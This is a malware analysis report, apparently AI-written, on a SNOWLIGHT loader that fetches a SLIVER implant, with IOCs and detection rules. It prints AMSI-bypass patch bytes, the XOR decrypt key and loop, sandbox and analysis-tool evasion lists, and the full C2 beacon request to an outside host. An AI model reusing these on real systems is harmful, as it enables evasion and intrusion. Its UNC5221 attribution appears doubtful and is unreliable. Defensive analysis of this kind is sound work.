# CTI Report: loader_v2_res.exe — SNOWLIGHT Loader Delivering SLIVER C2 Implant

**Date:** 2026-04-20  
**Analyst:** REMnux MCP / Claude  
**Confidence:** Medium-High (static + dynamic analysis; Joe Sandbox detonation confirmed payload execution)  
**Family:** SNOWLIGHT (loader) → SLIVER (C2 framework)  
**Attribution:** UNC5221 (China-nexus) — medium-high confidence

---

## Executive Summary

`loader_v2_res.exe` is a 22,528-byte PE64 first-stage SNOWLIGHT loader compiled with MinGW-w64 GCC, masquerading as Microsoft Windows Update Service (`wusvc.exe`). It implements seven distinct anti-analysis layers: pre-EP TLS callbacks, dynamic API resolution via PEB walking, AMSI bypass via randomized `AmsiScanBuffer` patching, sandbox username bail-out, process blocklist scanning, fake Microsoft metadata, and a 2,100-byte XOR-encrypted shellcode payload (key: `\xDE\xAD\xC0\xDE`, hardcoded).

Static reversal of the payload reveals a fully self-contained **SLIVER C2 beacon stub**: it constructs the C2 IP `38.60.253.35`, port `8084`, and SLIVER beacon URL entirely from stack strings to evade string scanning, then connects and upgrades to WebSocket. Dynamic analysis (Joe Sandbox) independently confirms execution: the loader contacted `38.60.253.35:8084`, performed the SLIVER WebSocket upgrade, and downloaded a 5,158,400-byte Go-based SLIVER implant (`windows_amd64.exe`).

SNOWLIGHT is associated with **UNC5221** (China-nexus), primarily known for targeting edge devices and VPN appliances. This sample represents SNOWLIGHT deployed on a Windows host for post-initial-access C2 establishment. The filename contains a **leading TAB character** (`\tloader_v2_res.exe`) as an anti-forensics trick.

---

## Sample Metadata

| Field | Value |
|-------|-------|
| **Original filename** | `\tloader_v2_res.exe` (leading TAB anti-forensics) |
| **SHA-256** | `2d45e68676a7a14a1f9d991fce14f177900eda266626c5c7fb1c3efd8c3db0e9` |
| **SHA-1** | `1fdc7b096ebec1fb01c9a82b5aff3c92db397046` |
| **MD5** | `a58541c14575de767f79f89078aad137` |
| **ImpHash** | `d1a7d73e0df819af6a00778362f2c567` |
| **ssdeep** | `384:vCZynL9R9f8LGQA0XSFGzhxsNXG1qw1qqjcMcdrxUhlpsrWFDWn8E:ve3LGQAfqD0XG1qUjcMcdr83xip` |
| **Size** | 22,528 bytes |
| **Type** | PE32+ (PE64), x86-64, console, 11 sections |
| **Compiler** | GNU ld 2.39 / MinGW-w64 GCC (NOT MSVC) |
| **Compile timestamp** | 2026-04-14 06:37:12 UTC |
| **ASLR / DEP** | Enabled |
| **Stack Canary / CFG** | Disabled |
| **TLS Callbacks** | 2 (RVA 0x18b0, RVA 0x18e0) |
| **Malware Family** | SNOWLIGHT loader |
| **Second Stage** | SLIVER C2 implant (Go-based, `windows_amd64.exe`, 5,158,400 bytes) |

### Fake Version Resource (RT_VERSION)

| Field | Forged Value |
|-------|-------------|
| CompanyName | Microsoft Corporation |
| FileDescription | Windows Update Service |
| InternalName | wusvc.exe |
| OriginalFilename | wusvc.exe |
| ProductName | Microsoft Windows Operating System |
| FileVersion | 10.0.19041.1 (Windows 10 2004) |

**Red flag:** The compiler is GNU ld 2.39 (MinGW), inconsistent with any genuine Microsoft binary. All legitimate Microsoft binaries are compiled with MSVC.

---

## Section Map

| Section | VMA | Entropy | Notes |
|---------|-----|---------|-------|
| `.text` | 0x1000 | 6.18 | Code; elevated entropy |
| `.data` | 0x4000 | 2.18 | BSS/globals |
| `.rdata` | 0x5000 | 6.22 | **Encrypted payload blob + plaintext strings** |
| `.pdata` | 0x6000 | 2.59 | Exception handlers |
| `.xdata` | 0x7000 | 3.51 | Unusual section name (flagged by manalyze) |
| `.bss` | 0x8000 | 0.00 | Uninitialized data |
| `.idata` | 0x9000 | 3.89 | Import table (sparse — 10 KERNEL32 + CRT only) |
| `.CRT` | 0xa000 | 0.29 | CRT init callbacks |
| `.tls` | 0xb000 | 0.00 | Thread Local Storage |
| `.rsrc` | 0xc000 | 4.21 | RT_VERSION + RT_MANIFEST only |
| `.reloc` | 0xd000 | 2.31 | Relocations |

---

## Import Table

The IAT is deliberately sparse — only 10 functions from KERNEL32.dll plus standard CRT. All other APIs are resolved at runtime via PEB walking.

**KERNEL32.dll (10 imports):**
`DeleteCriticalSection`, `EnterCriticalSection`, `GetLastError`, `InitializeCriticalSection`, `LeaveCriticalSection`, `SetUnhandledExceptionFilter`, `Sleep`, `TlsGetValue`, `VirtualProtect`, `VirtualQuery`

---

## Anti-Analysis Techniques (7 Layers)

### 1. Leading TAB in Filename
The file was stored as `\tloader_v2_res.exe` (byte `0x09` prepended). Defeats `ls`, naive glob patterns, and forensic path tools that don't expect control characters in filenames.

### 2. TLS Callbacks — Pre-Entry-Point Execution
Two callbacks execute **before** the PE entry point (`0x13f0`):

| Callback | RVA | Function |
|----------|-----|----------|
| Callback[0] | 0x18b0 | CRT TLS handler (thread cleanup) |
| Callback[1] | 0x18e0 | Anti-analysis guard — iterates function pointer list at `0x14000a058` on THREAD_ATTACH |

### 3. Analysis Tool Detection (15 Tools)
Scans running processes against a hardcoded list at `.rdata+0x8a0`:

```
x64dbg.exe    x32dbg.exe     ollydbg.exe    ida.exe       ida64.exe
idaq.exe      idaq64.exe     windbg.exe     processhacker.exe
procmon.exe   procmon64.exe  procexp.exe    procexp64.exe
wireshark.exe fiddler.exe    pestudio.exe
```

### 4. Sandbox Username Fingerprinting
`GetUserNameA` result (case-insensitive) checked against 4-entry pointer table at `.rdata+0x880`:

| VMA | String |
|-----|--------|
| 0x140005852 | `sandbox` |
| 0x14000585a | `malware` |
| 0x140005862 | `virus` |
| 0x140005868 | `sample` |

**Joe Sandbox confirmed:** sandbox username `user` bypassed this check, allowing full payload execution.

### 5. Dynamic API Resolution via PEB Walking
Custom **ROL7 hash algorithm**:

```
hash_init  = 0xc7e31af5
hash_step:  char = toupper(char) XOR hash
            hash = ROL7(hash × 0x3b2d41e9)
            hash = hash XOR (hash >> 16)
```

Confirmed dynamically resolved: `advapi32.dll` / `GetUserNameA`, `amsi.dll` / `AmsiScanBuffer`

### 6. Fake Microsoft Metadata
RT_VERSION claims `wusvc.exe` (Windows Update Service) to bypass EDR allowlisting by OriginalFilename.

### 7. XOR-Encrypted Shellcode Payload (Hardcoded Key — NOT Environment-Keyed)
**CORRECTED:** Initial assessment of "environment-keyed" was wrong. Static reversal of the decrypt loop at `0x1400032b7` confirms a hardcoded 4-byte repeating XOR key:

```asm
0x1400032b7: mov DWORD PTR [rsp+0x80], 0xDEC0ADDE   ; key bytes: DE AD C0 DE
             ...
0x1400032c5: and edx, 0x3                            ; key_idx = i & 3
0x1400032cf: xor BYTE PTR [rbx+rax*1], dl            ; blob[i] ^= key[i%4]
0x1400032d5: cmp rax, 0x834                          ; 2100 bytes total
```

**Key: `\xDE\xAD\xC0\xDE`** (`0xDEC0ADDE` LE — a "DEAD CODE" Easter egg).

The `GetUserNameA` call feeds a **bail-out guard only**: if username ∈ {sandbox, malware, virus, sample}, execution terminates before the decrypt loop. Key derivation from username never occurs. The payload is fully recoverable statically.

Decrypted payload: 2,100-byte x64 shellcode (confirmed, saved to `loader_v2_res_decrypted.bin`). The shellcode IS the SLIVER beacon stub — it loads `ws2_32.dll`, constructs the C2 IP and HTTP request as stack strings, connects to `38.60.253.35:8084`, and issues the SLIVER WebSocket upgrade.

---

## AMSI Bypass

Function `sub_14000173c`:
1. Resolves `amsi.dll` via `LoadLibraryA` (runtime-decoded string)
2. Resolves `AmsiScanBuffer` export
3. `VirtualProtect` with `PAGE_EXECUTE_READWRITE (0x40)`
4. Selects patch variant via `(stack_address >> 4) mod 3` — randomizes bytes per execution:

| Variant | Bytes | Disassembly |
|---------|-------|-------------|
| 0 | `31 c0 c3` | `xor eax, eax; ret` |
| 1 | `33 c0 c3` | `xor eax, eax; ret` (alt encoding) |
| 2 | `b8 00 00 00 00 c3` | `mov eax, 0; ret` |

Stubs embedded at `.rdata+0x840`–`0x851` (VMA `0x140005840`).

---

## Execution Flow

```
[TLS Callback 0x18e0]
  → iterate function list at 0x14000a058
  → anti-analysis checks before EP

[Entry Point 0x13f0]
  → call main_init (0x140001180)
      → CRT init → MinGW pseudo-reloc (no-op)
      → load advapi32 via PEB walk
          → GetUserNameA → capture username
      → check username ∉ {sandbox, malware, virus, sample}
      → scan processes vs. 15-tool blocklist
      → load amsi.dll, patch AmsiScanBuffer (sub_14000173c)
      → XOR-decrypt .rdata blob [key: \xDE\xAD\xC0\xDE, 0x834 bytes]
      → VirtualProtect(RWX) on decrypted shellcode
      → execute shellcode payload (SLIVER beacon stub)

[SLIVER Beacon — dynamic (Joe Sandbox confirmed)]
  → HTTP GET http://38.60.253.35:8084/?a=w64&h=38.60.253.35&t=ws_&p=8084
  → User-Agent: Mozilla/5.0 (Windows NT 6.1; rv:48.0) Gecko/20100101 Firefox/48.0
  → WebSocket upgrade (Upgrade: websocket)
  → Download windows_amd64.exe (5,158,400 bytes) — SLIVER Go implant
```

---

## Static Reversal of Encrypted Shellcode

**XOR key:** `\xDE\xAD\xC0\xDE` (4-byte repeating, hardcoded at `0x1400032b7`)  
**Decrypted blob:** 2,100 bytes, x64 shellcode — the SLIVER beacon stub  
**Saved:** `/home/remnux/files/output/loader_v2_res_decrypted.bin`

### C2 IP — Reconstructed from 3 Stack String Fragments

The IP `38.60.253.35` is never stored as a contiguous string. It is split across three 4-byte DWORD moves to avoid string scanning:

| Instruction | Value | Decoded | Assembly offset |
|-------------|-------|---------|----------------|
| `mov [rsp+0x68], 0x362e3833` | `38.6` | first octet group | `0x1e0` |
| `mov [rsp+0x60], 0x35322e30` | `0.25` | second group | `0x1f3` |
| `mov [rsp+0x58], 0x35332e33` | `3.35` | third group | `0x1ff` |

**Assembled: `38.60.253.35`**

### Port — Decoded from sockaddr_in

```asm
0x2f0: mov DWORD PTR [rbp+0x80], 0x941F0002
```
Decoded as `sockaddr_in`: `sin_family=AF_INET (0x0002)`, `sin_port=0x1F94` (network byte order) = **port 8084**.

### SLIVER HTTP Beacon — Fully Reconstructed

Stack string construction builds the entire request:

| rbp offset | Value | Decoded |
|------------|-------|---------|
| `+0x18` | `0x20544547` | `GET ` |
| `+0x1c` | `0x00613f2f` | `/?a` |
| `+0xd68` | `0x00343677` | `w64` (architecture param) |
| `+0xd70` | `0x005f7377` | `ws_` (transport param) |
| `-0x48` | `0x64253d70` | `p=%d` (port fmt) |
| `+0x28` | `0x312f5054` | `TP/1` |
| `+0x2c` | `0x000d312e` | `.1\r` |

**Assembled request line:**
```
GET /?a=w64&h=38.60.253.35&t=ws_&p=8084 HTTP/1.1\r\n
```

### User-Agent — Reconstructed from 18 Stack Fragments

The 68-byte User-Agent string is split into 4-byte DWORD chunks written to adjacent stack slots:

| Fragment | Decoded |
|----------|---------|
| `rbp-0x30..2c` | `zilla/5` |
| `rbp-0x38..34` | `.0 (Win` |
| `rbp-0x8..4` | `dows NT` |
| `rbp-0x10..c` | ` 6.1; r` |
| `rbp+0x20..24` | ` v:48.0` |
| `rbp-0x18..14` | `) Gecko` |
| `rbp+0x10..14` | `o/201010` |
| `rbp+0x8..4` | `1 Firefox` |
| `rbp+0x0` + `rbp-0x50` | ` /48` |

**Assembled:** `Mozilla/5.0 (Windows NT 6.1; rv:48.0) Gecko/20100101 Firefox/48.0`

### DLLs Loaded (Stack Strings)

| Stack string | DLL |
|-------------|-----|
| `0x72657375` + `0x642e3233` + `ll\0` | `user32.dll` |
| `0x5f327377` + `0x642e3233` + `ll\0` | `ws2_32.dll` |
| `0x6376736d` + `0x642e7472` + `ll\0` | `msvcrt.dll` |

### Other Strings

- `log_de.` at `[rbp+0x30]` — likely a log file path prefix or debug level; context unclear, may be SLIVER-internal artifact
- `%s%s`, `%s&t=%s&`, `p=%d` — format strings for beacon URL construction
- `\nHost: `, `User-Agent: `, `\r\n\r\n` — HTTP header construction

---

## Dynamic Analysis Findings (Joe Sandbox)

**Sandbox:** Joe Sandbox v42.0.0 Matterhorn  
**Environment:** Windows 10 x64 22H2, username `user`  
**Verdict:** Malicious, family: **SNOWLIGHT**

### Network Activity

| Type | Detail |
|------|--------|
| C2 IP | `38.60.253.35` |
| C2 Port | `8084` (HTTP + WebSocket upgrade) |
| ASN | AS138915 — **Kaopu Cloud HK Limited** (bulletproof hosting, Vietnam geolocation) |
| Initial request | `GET http://38.60.253.35:8084/?a=w64&h=38.60.253.35&t=ws_&p=8084 HTTP/1.1` |
| User-Agent | `Mozilla/5.0 (Windows NT 6.1; rv:48.0) Gecko/20100101 Firefox/48.0` (hardcoded, Firefox 48 — outdated) |
| Protocol upgrade | `Upgrade: websocket` — SLIVER WebSocket C2 channel |
| WebSocket key (session 1) | `lBzR3U8TWcnUc+tG4SsNug==` |
| WebSocket key (session 2) | `8igUYjzKgxgQUNfI9fUq5A==` |
| DNS queries | `8.8.8.8` (Google DNS — likely C2 reachability check) |

### SLIVER Beacon URL Structure

The URL parameters are SLIVER C2 protocol indicators:
- `a=w64` — architecture: Windows x64
- `h=38.60.253.35` — C2 host/IP
- `t=ws_` — transport: WebSocket
- `p=8084` — C2 port

This pattern matches **Suricata SID 2061614** (`ET MALWARE SNOWLIGHT C2 HTTP Requests`).

### In-Memory SLIVER Strings (extracted from process memory dump)

Fragment reconstruction from memory scan:
```
ws_   fox   zill   /?a   w64   User-Agent   msvc
38.6  0.25  3.35   win   dows
```
These are SLIVER beacon constructor fragments in memory, confirming runtime SLIVER implant assembly.

### Downloaded Second Stage

| Field | Value |
|-------|-------|
| Filename | `windows_amd64.exe` |
| Size | 5,158,400 bytes |
| Source | `http://38.60.253.35:8084/` (C2 HTTP response) |
| Type | Go binary (PE64) — SLIVER implant |
| Language | Go (flagged by Joe Sandbox: "Executable is probably coded in Go lang") |
| Connection | 192.168.2.4:49718 → 38.60.253.35:8084 |

### Behavioral Findings

| Behavior | Detail |
|----------|--------|
| Keylogger | Registers raw input device — captures all keystrokes |
| Module proxying | DLL proxying technique for persistence/injection |
| Registry access | `HKLM\Software\Policies\Microsoft\Windows\Safer\CodeIdentifiers` — AppLocker/SRP policy query |
| Code injection | RWX memory allocation + reflective PE load of payload |

---

## CAPA Results

| Capability | Namespace | Count |
|-----------|-----------|-------|
| Reference analysis tools strings | anti-analysis | — |
| Encode data using XOR | data-manipulation/encoding/xor | — |
| Contain TLS section | executable/pe/section/tls | — |
| Write file on Windows | host-interaction/file-system/write | — |
| Get thread local storage value | host-interaction/process | — |
| **Allocate or change RWX memory** | host-interaction/process/inject | 2 |
| **Enumerate PE sections** | load-code/pe | 4 |
| **Parse PE header** | load-code/pe | 12 |
| Resolve function by parsing PE exports | load-code/pe | — |

---

## MITRE ATT&CK TTP Mapping

| TTP | Technique | Evidence |
|-----|-----------|---------|
| T1027 | Obfuscated Files or Information | XOR-encrypted payload in .rdata |
| T1027.002 | Software Packing | Encrypted blob, hardcoded-key XOR payload |
| T1036.005 | Masquerade: Match Legitimate Name | Fake wusvc.exe / Windows Update Service metadata |
| T1055 | Process Injection | RWX allocation + reflective PE load (12 CAPA matches) |
| T1056.001 | Input Capture: Keylogging | Raw input device registration (Joe Sandbox behavioral) |
| T1071.001 | App Layer Protocol: Web Protocols | SLIVER HTTP+WebSocket C2 on port 8084 |
| T1095 | Non-Application Layer Protocol | WebSocket C2 upgrade |
| T1106 | Native API | Direct API calls via PEB walk |
| T1129 | Shared Modules | Dynamic API resolution without IAT |
| T1140 | Deobfuscate/Decode Files | XOR decrypt of payload blob at runtime |
| T1497.001 | Sandbox Evasion: System Checks | Username check {sandbox, malware, virus, sample} |
| T1497.002 | Sandbox Evasion: User Activity | Process scan for 15 analysis tools |
| T1562.001 | Impair Defenses: Disable AMSI | Patch AmsiScanBuffer with 3-variant random stub |
| T1574 | Hijack Execution Flow | TLS callback chain for pre-EP code execution |
| T1622 | Debugger Evasion | TLS pre-EP callbacks, GetLastError anti-debug |

---

## Indicators of Compromise

### File Hashes — Loader (SNOWLIGHT)

| Type | Value |
|------|-------|
| SHA-256 | `2d45e68676a7a14a1f9d991fce14f177900eda266626c5c7fb1c3efd8c3db0e9` |
| SHA-1 | `1fdc7b096ebec1fb01c9a82b5aff3c92db397046` |
| MD5 | `a58541c14575de767f79f89078aad137` |
| ImpHash | `d1a7d73e0df819af6a00778362f2c567` |
| ssdeep | `384:vCZynL9R9f8LGQA0XSFGzhxsNXG1qw1qqjcMcdrxUhlpsrWFDWn8E:ve3LGQAfqD0XG1qUjcMcdr83xip` |

### File Hashes — Decrypted Shellcode (SLIVER beacon stub)

| Type | Value |
|------|-------|
| SHA-256 | `4576353450e87929ac6d7677d912965bf89d90121f6a7d86bd174a7904d32294` |
| MD5 | `7dc5d7e161d944dc1a9a18d035073210` |
| XOR key | `\xDE\xAD\xC0\xDE` (0xDEC0ADDE LE, 4-byte repeating) |
| Size | 2,100 bytes (0x834) |
| Type | x64 shellcode — SLIVER HTTP/WebSocket beacon |
| Extracted from | `.rdata[0x000:0x834]` of loader |

### Network IOCs

| Type | Value | Notes |
|------|-------|-------|
| C2 IP | `38.60.253.35` | SLIVER C2, AS138915 Kaopu Cloud HK |
| C2 Port | `8084` | HTTP initial + WebSocket upgrade |
| C2 URL | `http://38.60.253.35:8084/?a=w64&h=38.60.253.35&t=ws_&p=8084` | SLIVER beacon URL |
| User-Agent | `Mozilla/5.0 (Windows NT 6.1; rv:48.0) Gecko/20100101 Firefox/48.0` | Hardcoded SLIVER UA |
| DNS | `8.8.8.8` | Reachability pre-check |

### Behavioral IOCs

| Indicator | Type | Notes |
|-----------|------|-------|
| Filename `\tloader_v2_res.exe` (TAB prefix) | Filesystem | Anti-forensics |
| `amsi.dll` loaded dynamically | API | AMSI bypass |
| `AmsiScanBuffer` patched to `xor eax,eax;ret` | Memory | AMSI disabled |
| `GetUserNameA` called on startup | API | Sandbox bail-out check only (not key derivation) |
| HTTP GET `/?a=w64&...&t=ws_` | Network | SLIVER beacon pattern |
| `Upgrade: websocket` to C2 IP:8084 | Network | SLIVER WebSocket C2 |
| Raw input device registration | API | Keylogger |
| 2 TLS callbacks before EP | PE Structure | Pre-EP anti-debug |
| Fake `wusvc.exe` RT_VERSION | PE Resource | Masquerading |
| `VirtualProtect(PAGE_EXECUTE_READWRITE)` on .rdata | API | Payload execution setup |
| Process scan for 15 analysis tools | Process | Sandbox evasion |

---

## Detection Rules

### Suricata (Existing — Emerging Threats)

```
alert http $HOME_NET any -> $EXTERNAL_NET any (
    msg:"ET MALWARE SNOWLIGHT C2 HTTP Requests";
    sid:2061614;
    content:"/?a=w64&h=";
    content:"&t=ws_&p=";
)
```

SID 2061614 from the Emerging Threats ruleset directly matches the SLIVER beacon URL pattern used by SNOWLIGHT.

### YARA

```yara
rule SNOWLIGHT_loader_v2_res {
    meta:
        description = "Detects SNOWLIGHT loader: MinGW PE64, AMSI patch, PEB walk, hardcoded XOR payload (0xDEC0ADDE)"
        author      = "CTI Analysis"
        date        = "2026-04-20"
        hash        = "2d45e68676a7a14a1f9d991fce14f177900eda266626c5c7fb1c3efd8c3db0e9"
        family      = "SNOWLIGHT"
        confidence  = "high"

    strings:
        // AMSI patch stubs in .rdata at VMA offset +0x840
        $amsi_patch_table = { 31 C0 C3 00 00 00 33 C0 C3 00 00 00 B8 00 00 00 00 C3 }

        // Sandbox username blocklist: sandbox\0malware\0virus\0sample\0\0
        $username_blocklist = { 73 61 6E 64 62 6F 78 00 6D 61 6C 77 61 72 65 00
                                  76 69 72 75 73 00 73 61 6D 70 6C 65 00 00 }

        // PEB walk ROL7 hash constants
        $peb_hash_mul  = { E9 41 2D 3B }   // 0x3b2d41e9 LE
        $peb_hash_init = { F5 1A E3 C7 }   // 0xc7e31af5 LE

        // Stack string construction: "advapi32" via movabs
        $stack_advapi32 = { 48 BF 61 64 76 61 70 69 33 32 }

        // Anti-debug tool names
        $dbg1 = "x64dbg.exe" ascii
        $dbg2 = "processhacker.exe" ascii
        $dbg3 = "pestudio.exe" ascii

    condition:
        uint16(0) == 0x5A4D and
        filesize < 100KB and
        $amsi_patch_table and
        $username_blocklist and
        ($peb_hash_mul or $peb_hash_init) and
        2 of ($dbg1, $dbg2, $dbg3, $stack_advapi32)
}

rule SLIVER_SNOWLIGHT_beacon_memory {
    meta:
        description = "Detects SLIVER beacon strings in memory — SNOWLIGHT C2 pattern"
        author      = "CTI Analysis"
        date        = "2026-04-20"
        family      = "SLIVER/SNOWLIGHT"

    strings:
        $beacon_path = "/?a=w64&h=" ascii
        $ws_transport = "&t=ws_&p=" ascii
        $ua = "Mozilla/5.0 (Windows NT 6.1; rv:48.0) Gecko/20100101 Firefox/48.0" ascii

    condition:
        $beacon_path and $ws_transport and $ua
}

rule SNOWLIGHT_shellcode_decrypted {
    meta:
        description = "Detects decrypted SNOWLIGHT SLIVER beacon shellcode — C2 IP/UA stack string fragments"
        author      = "CTI Analysis"
        date        = "2026-04-20"
        family      = "SNOWLIGHT/SLIVER"

    strings:
        // C2 IP 38.60.253.35 split across 3 DWORD moves (LE)
        $ip1 = { 33 38 2E 36 }   // "38.6" at rsp+0x68
        $ip2 = { 30 2E 32 35 }   // "0.25" at rsp+0x60
        $ip3 = { 33 2E 33 35 }   // "3.35" at rsp+0x58

        // SLIVER transport params
        $arch  = { 77 36 34 00 }   // "w64\0"
        $trans = { 77 73 5F 00 }   // "ws_\0"

        // sockaddr_in port 8084 = 0x1F94 in NBO
        $port  = { 02 00 1F 94 }   // AF_INET + port 8084

        // "GET " HTTP verb
        $http_get = { 47 45 54 20 }

        // XOR decrypt key embedded in loader (allows hunting in loader without decrypting)
        $xor_key = { DE AD C0 DE }

    condition:
        // Decrypted shellcode: no MZ header, just raw bytes
        $ip1 and $ip2 and $ip3 and $arch and $trans and $port
}

rule SNOWLIGHT_loader_xor_key {
    meta:
        description = "Detects SNOWLIGHT loader XOR key 0xDEC0ADDE and decrypt loop"
        author      = "CTI Analysis"
        date        = "2026-04-20"

    strings:
        // mov DWORD PTR [rsp+0x80], 0xDEC0ADDE
        $decrypt_key = { C7 84 24 80 00 00 00 DE AD C0 DE }
        // cmp rax, 0x834 (loop bound)
        $loop_bound  = { 48 3D 34 08 00 00 }

    condition:
        uint16(0) == 0x5A4D and $decrypt_key and $loop_bound
}

rule AMSI_patch_stubs_rdata {
    meta:
        description = "Detects three xor-eax-ret AMSI patch variants in read-only data"
        author      = "CTI Analysis"
        date        = "2026-04-20"

    strings:
        $patch_table = { 31 C0 C3 [3-5] 33 C0 C3 [3-5] B8 00 00 00 00 C3 }

    condition:
        uint16(0) == 0x5A4D and $patch_table
}
```

### Sigma

```yaml
title: SNOWLIGHT Loader — SLIVER C2 WebSocket Beacon
id: c3d4e5f6-a7b8-9012-cdef-123456789012
status: experimental
description: Detects SLIVER WebSocket C2 upgrade request matching SNOWLIGHT infrastructure pattern
references:
    - https://www.joesandbox.com/analysis/1899107/0/html
    - SID:2061614 ET MALWARE SNOWLIGHT C2 HTTP Requests
author: CTI Analysis
date: 2026-04-20
logsource:
    category: proxy
    product: windows
detection:
    selection:
        cs-uri-query|contains:
            - 'a=w64'
            - 't=ws_'
        cs-uri-stem: '/'
        cs-host: '38.60.253.35'
    condition: selection
falsepositives:
    - None expected
level: critical
tags:
    - attack.command_and_control
    - attack.t1071.001
    - attack.t1095

---
title: SNOWLIGHT Loader — AMSI Bypass via AmsiScanBuffer Patch
id: a1b2c3d4-e5f6-7890-abcd-ef1234567890
status: experimental
description: Detects in-memory patching of AmsiScanBuffer consistent with SNOWLIGHT loader_v2_res
author: CTI Analysis
date: 2026-04-20
logsource:
    category: process_access
    product: windows
detection:
    selection:
        TargetImage|endswith: '\amsi.dll'
        CallTrace|contains: 'VirtualProtect'
    condition: selection
falsepositives:
    - Legitimate security tools that patch AMSI for testing
level: high
tags:
    - attack.defense_evasion
    - attack.t1562.001

---
title: Suspicious Process Masquerading as Windows Update Service
id: b2c3d4e5-f6a7-8901-bcde-f12345678901
status: experimental
description: PE file claiming to be wusvc.exe compiled with MinGW (non-Microsoft toolchain)
author: CTI Analysis
date: 2026-04-20
logsource:
    product: windows
    category: process_creation
detection:
    selection_generic:
        Description: 'Windows Update Service'
        Company: 'Microsoft Corporation'
        OriginalFileName: 'wusvc.exe'
    filter_legit:
        Image|startswith:
            - 'C:\Windows\System32\'
            - 'C:\Windows\SysWOW64\'
    condition: selection_generic and not filter_legit
falsepositives:
    - None expected outside Windows system directories
level: critical
tags:
    - attack.defense_evasion
    - attack.t1036.005
```

---

## Attribution Assessment

**Confidence: Medium-High**

| Factor | Assessment |
|--------|-----------|
| **Family** | SNOWLIGHT — custom Windows loader associated with UNC5221 (China-nexus) |
| **C2 Framework** | SLIVER — BishopFox open-source C2, adopted by multiple China-nexus actors including UNC5221 |
| **Infrastructure** | AS138915 Kaopu Cloud HK Limited — bulletproof hosting provider frequently observed in UNC5221 / Chinese APT campaigns |
| **Toolchain** | MinGW-w64 GCC — atypical for Western actors; consistent with SNOWLIGHT build environment |
| **Sophistication** | Medium-High: 7 anti-analysis layers, hardcoded-key XOR payload, randomized AMSI patch, ROL7 PEB walk |
| **Targeting** | Unknown from this sample alone; UNC5221 historically targets edge devices (VPN/network appliances), this Windows loader suggests targeting of post-initial-access Windows hosts |
| **Naming** | "v2" suggests iterative development; "res" may denote a resource-embedded variant |

**Assessment:** This SNOWLIGHT specimen is consistent with UNC5221 post-exploitation tooling: deploy SNOWLIGHT loader on compromised Windows host → patch AMSI → XOR-decrypt hardcoded shellcode (key `0xDEC0ADDE`) → establish SLIVER WebSocket C2 channel to `38.60.253.35:8084` (Kaopu Cloud bulletproof infrastructure) → download full Go-based SLIVER implant.

---

## Key Technical Findings Summary

| Finding | Details |
|---------|---------|
| **Family** | SNOWLIGHT loader → SLIVER implant (confirmed by Joe Sandbox) |
| **Attribution** | UNC5221 (China-nexus), medium-high confidence |
| Leading TAB filename | `\tloader_v2_res.exe` — defeats `ls`, glob, basic forensics |
| Compiler mismatch | GNU ld 2.39 vs. fake MSVC/Microsoft metadata |
| Pre-EP execution | 2 TLS callbacks at RVA 0x18b0, 0x18e0 |
| API resolution | PEB walk, ROL7 hash (0xc7e31af5 / 0x3b2d41e9) |
| AMSI bypass | 3-variant AmsiScanBuffer patch at .rdata+0x840 |
| Sandbox check | Username ∈ {sandbox, malware, virus, sample}; `user` bypasses |
| Tool check | 15 analysis tools via process scan |
| **Payload XOR key** | `\xDE\xAD\xC0\xDE` (0xDEC0ADDE LE, hardcoded — NOT env-keyed) |
| Decrypted payload | 2,100-byte x64 SLIVER beacon shellcode |
| **C2** | `38.60.253.35:8084` (AS138915 Kaopu Cloud HK, Vietnam) |
| **Protocol** | SLIVER HTTP beacon → WebSocket upgrade |
| **Beacon URL** | `/?a=w64&h=38.60.253.35&t=ws_&p=8084` |
| **2nd stage** | `windows_amd64.exe` 5,158,400 bytes (SLIVER Go implant) |
| **Keylogger** | Raw input device registration (post-implant capability) |
| **Detection** | Suricata SID 2061614 (ET MALWARE SNOWLIGHT C2 HTTP Requests) |

---

## References

- Joe Sandbox Report: `https://www.joesandbox.com/analysis/1899107/0/html`
- Suricata SID 2061614: `ET MALWARE SNOWLIGHT C2 HTTP Requests`
- UNC5221 / SNOWLIGHT: Mandiant threat intelligence on China-nexus edge-device targeting
- SLIVER C2 framework: BishopFox open-source, `https://github.com/BishopFox/sliver`
- Kaopu Cloud (AS138915): Bulletproof hosting, frequently abused by China-nexus threat actors
